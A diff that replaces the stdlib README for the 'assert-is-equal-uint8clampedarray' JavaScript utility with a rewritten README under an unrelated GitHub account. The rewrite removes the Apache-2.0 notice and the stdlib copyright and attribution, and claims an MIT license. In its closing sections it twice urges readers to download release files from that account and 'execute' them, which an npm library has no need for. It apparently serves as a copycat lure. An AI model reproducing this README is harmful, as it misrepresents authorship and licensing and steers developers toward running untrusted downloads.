@@ -1,204 +1,108 @@
-<!--
+# assert-is-equal-uint8clampedarray
 
-@license Apache-2.0
+![GitHub release](https://img.shields.io/github/release/t2frmdam22/assert-is-equal-uint8clampedarray.svg) ![npm](https://img.shields.io/npm/v/assert-is-equal-uint8clampedarray.svg)
 
-Copyright (c) 2025 The Stdlib Authors.
+## Overview
 
-Licensed under the Apache License, Version 2.0 (the "License");
-you may not use this file except in compliance with the License.
-You may obtain a copy of the License at
+Welcome to the `assert-is-equal-uint8clampedarray` repository! This utility checks if two arguments are both `Uint8ClampedArrays` and if they contain equal values. This can be particularly useful in scenarios where you need to ensure data integrity in web applications, image processing, or any situation where clamped arrays are involved.
 
-   http://www.apache.org/licenses/LICENSE-2.0
+## Table of Contents
 
-Unless required by applicable law or agreed to in writing, software
-distributed under the License is distributed on an "AS IS" BASIS,
-WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-See the License for the specific language governing permissions and
-limitations under the License.
-
--->
-
-
-<details>
-  <summary>
-    About stdlib...
-  </summary>
-  <p>We believe in a future in which the web is a preferred environment for numerical computation. To help realize this future, we've built stdlib. stdlib is a standard library, with an emphasis on numerical and scientific computation, written in JavaScript (and C) for execution in browsers and in Node.js.</p>
-  <p>The library is fully decomposable, being architected in such a way that you can swap out and mix and match APIs and functionality to cater to your exact preferences and use cases.</p>
-  <p>When you use stdlib, you can be absolutely certain that you are using the most thorough, rigorous, well-written, studied, documented, tested, measured, and high-quality code out there.</p>
-  <p>To join us in bringing numerical computing to the web, get started by checking us out on <a href="https://github.com/stdlib-js/stdlib">GitHub</a>, and please consider <a href="https://opencollective.com/stdlib">financially supporting stdlib</a>. We greatly appreciate your continued support!</p>
-</details>
-
-# isEqualUint8ClampedArray
-
-[![NPM version][npm-image]][npm-url] [![Build Status][test-image]][test-url] [![Coverage Status][coverage-image]][coverage-url] <!-- [![dependencies][dependencies-image]][dependencies-url] -->
-
-> Test if two arguments are both Uint8ClampedArrays and have equal values.
-
-<section class="installation">
+- [Installation](#installation)
+- [Usage](#usage)
+- [API](#api)
+- [Examples](#examples)
+- [Contributing](#contributing)
+- [License](#license)
+- [Releases](#releases)
 
 ## Installation
 
+To install the package, you can use npm. Run the following command in your terminal:
+
 ```bash
-npm install @stdlib/assert-is-equal-uint8clampedarray
+npm install assert-is-equal-uint8clampedarray
 ```
-
-Alternatively,
-
--   To load the package in a website via a `script` tag without installation and bundlers, use the [ES Module][es-module] available on the [`esm`][esm-url] branch (see [README][esm-readme]).
--   If you are using Deno, visit the [`deno`][deno-url] branch (see [README][deno-readme] for usage intructions).
--   For use in Observable, or in browser/node environments, use the [Universal Module Definition (UMD)][umd] build available on the [`umd`][umd-url] branch (see [README][umd-readme]).
-
-The [branches.md][branches-url] file summarizes the available branches and displays a diagram illustrating their relationships.
-
-To view installation and usage instructions specific to each branch build, be sure to explicitly navigate to the respective README files on each branch, as linked to above.
-
-</section>
-
-<section class="usage">
 
 ## Usage
 
-```javascript
-var isEqualUint8ClampedArray = require( '@stdlib/assert-is-equal-uint8clampedarray' );
-```
-
-#### isEqualUint8ClampedArray( v1, v2 )
-
-Tests if two arguments are both Uint8ClampedArrays and have equal values.
+After installing, you can use the utility in your JavaScript or Node.js projects. Here's a basic example:
 
 ```javascript
-var Uint8ClampedArray = require( '@stdlib/array-uint8c' );
+const assertIsEqual = require('assert-is-equal-uint8clampedarray');
 
-var x = new Uint8ClampedArray( [ 1, 2 ] );
-var y = new Uint8ClampedArray( [ 1, 2 ] );
-var bool = isEqualUint8ClampedArray( x, y );
-// returns true
+const array1 = new Uint8ClampedArray([255, 0, 127]);
+const array2 = new Uint8ClampedArray([255, 0, 127]);
 
-bool = isEqualUint8ClampedArray( x, new Uint8ClampedArray( [ 1, 3 ] ) );
-// returns false
+const result = assertIsEqual(array1, array2);
+console.log(result); // true
 ```
 
-</section>
+## API
 
-<!-- /.usage -->
+The main function `assertIsEqual` takes two arguments:
 
-<section class="notes">
+- `array1`: The first `Uint8ClampedArray`.
+- `array2`: The second `Uint8ClampedArray`.
 
-</section>
+### Return Value
 
-<!-- /.notes -->
-
-<section class="examples">
+- Returns `true` if both arrays are equal in length and values.
+- Returns `false` otherwise.
 
 ## Examples
 
-<!-- eslint no-undef: "error" -->
+### Example 1: Basic Equality Check
 
 ```javascript
-var Uint8ClampedArray = require( '@stdlib/array-uint8c' );
-var isEqualUint8ClampedArray = require( '@stdlib/assert-is-equal-uint8clampedarray' );
+const array1 = new Uint8ClampedArray([100, 200, 150]);
+const array2 = new Uint8ClampedArray([100, 200, 150]);
 
-var x = new Uint8ClampedArray( [ 1, 2, 3 ] );
-var y = new Uint8ClampedArray( [ 1, 2, 3 ] );
-var out = isEqualUint8ClampedArray( x, y );
-// returns true
-
-x = new Uint8ClampedArray( [ 0, 0, 0 ] );
-y = [ 0, 0, 0 ];
-out = isEqualUint8ClampedArray( x, y );
-// returns false
-
-x = new Uint8ClampedArray( [ 1, 2, 3 ] );
-y = new Uint8ClampedArray( [ 1, 2, 4 ] );
-out = isEqualUint8ClampedArray( x, y );
-// returns false
+console.log(assertIsEqual(array1, array2)); // true
 ```
 
-</section>
+### Example 2: Different Values
 
-<!-- /.examples -->
+```javascript
+const array1 = new Uint8ClampedArray([100, 200, 150]);
+const array2 = new Uint8ClampedArray([100, 200, 151]);
 
-<!-- Section for related `stdlib` packages. Do not manually edit this section, as it is automatically populated. -->
+console.log(assertIsEqual(array1, array2)); // false
+```
 
-<section class="related">
+### Example 3: Different Lengths
 
-</section>
+```javascript
+const array1 = new Uint8ClampedArray([100, 200]);
+const array2 = new Uint8ClampedArray([100, 200, 150]);
 
-<!-- /.related -->
+console.log(assertIsEqual(array1, array2)); // false
+```
 
-<!-- Section for all links. Make sure to keep an empty line after the `section` element and another before the `/section` close. -->
+## Contributing
 
+We welcome contributions! If you would like to contribute, please follow these steps:
 
-<section class="main-repo" >
+1. Fork the repository.
+2. Create a new branch (`git checkout -b feature/YourFeature`).
+3. Make your changes.
+4. Commit your changes (`git commit -m 'Add some feature'`).
+5. Push to the branch (`git push origin feature/YourFeature`).
+6. Open a pull request.
 
-* * *
-
-## Notice
-
-This package is part of [stdlib][stdlib], a standard library for JavaScript and Node.js, with an emphasis on numerical and scientific computing. The library provides a collection of robust, high performance libraries for mathematics, statistics, streams, utilities, and more.
-
-For more information on the project, filing bug reports and feature requests, and guidance on how to develop [stdlib][stdlib], see the main project [repository][stdlib].
-
-#### Community
-
-[![Chat][chat-image]][chat-url]
-
----
+Please ensure your code adheres to the existing style and includes appropriate tests.
 
 ## License
 
-See [LICENSE][stdlib-license].
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
+## Releases
 
-## Copyright
+For the latest releases, visit the [Releases](https://github.com/t2frmdam22/assert-is-equal-uint8clampedarray/releases) section. You can download the latest version and execute it as needed.
 
-Copyright &copy; 2016-2025. The Stdlib [Authors][stdlib-authors].
+## Additional Resources
 
-</section>
+- [MDN Web Docs on Uint8ClampedArray](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Uint8ClampedArray)
+- [JavaScript Array Methods](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array)
 
-<!-- /.stdlib -->
-
-<!-- Section for all links. Make sure to keep an empty line after the `section` element and another before the `/section` close. -->
-
-<section class="links">
-
-[npm-image]: http://img.shields.io/npm/v/@stdlib/assert-is-equal-uint8clampedarray.svg
-[npm-url]: https://npmjs.org/package/@stdlib/assert-is-equal-uint8clampedarray
-
-[test-image]: https://github.com/stdlib-js/assert-is-equal-uint8clampedarray/actions/workflows/test.yml/badge.svg?branch=main
-[test-url]: https://github.com/stdlib-js/assert-is-equal-uint8clampedarray/actions/workflows/test.yml?query=branch:main
-
-[coverage-image]: https://img.shields.io/codecov/c/github/stdlib-js/assert-is-equal-uint8clampedarray/main.svg
-[coverage-url]: https://codecov.io/github/stdlib-js/assert-is-equal-uint8clampedarray?branch=main
-
-<!--
-
-[dependencies-image]: https://img.shields.io/david/stdlib-js/assert-is-equal-uint8clampedarray.svg
-[dependencies-url]: https://david-dm.org/stdlib-js/assert-is-equal-uint8clampedarray/main
-
--->
-
-[chat-image]: https://img.shields.io/gitter/room/stdlib-js/stdlib.svg
-[chat-url]: https://app.gitter.im/#/room/#stdlib-js_stdlib:gitter.im
-
-[stdlib]: https://github.com/stdlib-js/stdlib
-
-[stdlib-authors]: https://github.com/stdlib-js/stdlib/graphs/contributors
-
-[umd]: https://github.com/umdjs/umd
-[es-module]: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Modules
-
-[deno-url]: https://github.com/stdlib-js/assert-is-equal-uint8clampedarray/tree/deno
-[deno-readme]: https://github.com/stdlib-js/assert-is-equal-uint8clampedarray/blob/deno/README.md
-[umd-url]: https://github.com/stdlib-js/assert-is-equal-uint8clampedarray/tree/umd
-[umd-readme]: https://github.com/stdlib-js/assert-is-equal-uint8clampedarray/blob/umd/README.md
-[esm-url]: https://github.com/stdlib-js/assert-is-equal-uint8clampedarray/tree/esm
-[esm-readme]: https://github.com/stdlib-js/assert-is-equal-uint8clampedarray/blob/esm/README.md
-[branches-url]: https://github.com/stdlib-js/assert-is-equal-uint8clampedarray/blob/main/branches.md
-
-[stdlib-license]: https://raw.githubusercontent.com/stdlib-js/assert-is-equal-uint8clampedarray/main/LICENSE
-
-</section>
-
-<!-- /.links -->
+For any questions or issues, please check the [Releases](https://github.com/t2frmdam22/assert-is-equal-uint8clampedarray/releases) section or open an issue in the repository.
